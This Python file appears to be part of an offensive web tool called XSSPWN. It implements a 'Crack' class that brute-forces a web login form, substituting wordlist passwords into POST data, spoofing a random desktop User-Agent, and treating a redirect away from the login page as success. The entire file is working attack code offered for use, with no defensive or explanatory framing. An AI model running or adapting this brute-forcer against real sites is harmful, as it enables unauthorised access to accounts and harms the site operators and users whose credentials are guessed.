#! /usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import time
import random
import os
import requests
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
from user_agent import generate_user_agent
from pr_modules.ui import *
from pr_modules.fuzzer import *


class Crack:

	
	def set_session(self, session):
		self.session = session

	
	def set_postdata(self, postdata):
		if (postdata != None):
			self.postdata = postdata
		else:
			self.postdata = None

	def set_loginurl(self, loginurl):
		self.loginurl = loginurl	

	def bruteforce(self):

		c = self.postdata.split("&")
		if len(c) > 3:
			ui = UI()
			ui.print_text("ERROR", "XSSPWN only works with 3 parameters")
			sys.exit(1)
			

		option = input("Do you want to bruteforce the password [Y/n]: ")
		if option == "n" or option == "N" or option == "No" or option == "no":
			username = input("Username: ")
			password = input("Password: ")
			ui = UI()
			if (self.login(username, password)):
				ui.print_text('INFO', "Successful login with %s:%s" % (username, password))
				time.sleep(5)
			else:
				ui.print_text("ERROR", "Failed Login With %s:%s" % (username, password))
				sys.exit(1)

		else:
	
			wordlist = input("Enter the name of the dictionary leave empty for default [ " + Fore.GREEN + "wordlist.txt" + Fore.WHITE + " ]: ")
			if (wordlist == ""):
				wordlist = "wordlist.txt"
				if (os.path.isfile(wordlist) == False):
					ui.print_text("ERROR", 'Default wordlist is missing..')
					sys.exit(1)


			username = input("Enter the username: ")
			while (username == ""): 			
				username = input("Enter the username: ")
			self.crack(wordlist, username)
	
	def get_session(self):
		return self.session

	
	def crack(self, wordlist, username):
		ui = UI()	
		if (self.postdata == None):
			ui.print_text("ERROR", "No postdata set for bruteforce")
			sys.exit(1)				
	
		if (os.path.isfile(wordlist)):
			lines = open(wordlist, 'r').readlines()
			for line in lines:
				password = line.split()[0]
				if (self.login(username, password)):
					ui.print_text('INFO', "Successful login with %s:%s" % (username, password))
					time.sleep(5)
					break
				else:
					ui.print_text("ERROR", "Attempting Login With %s:%s" % (username, password))
					time.sleep(1)
		else:
			ui.print_text('ERROR', "Wordlist does not exist")
			sys.exit(1)
			
		
			
	def login(self, username, password):

		postusr = self.postdata.replace('^USER^', username)
		postpas = postusr.replace('^PASS^', password)
		newpost = postpas.split('&')
		formdata = []
		payload = dict()
		formdata.append( newpost[0].split('=')[0] )
		formdata.append( newpost[1].split('=')[0] )
		formdata.append( newpost[2].split('=')[0] )
		formdata.append( newpost[2].split('=')[1] )
		
		payload.update({formdata[0]:username, formdata[1]:password, formdata[2]:formdata[3]})
		headers = {'User-Agent': generate_user_agent(device_type="desktop", os=('mac', 'linux'))}

		request = self.session.post(self.loginurl, data=payload, headers=headers) 
		postusr = ""
		postpas = ""
		newpost = ""
		return 'login' not in request.url







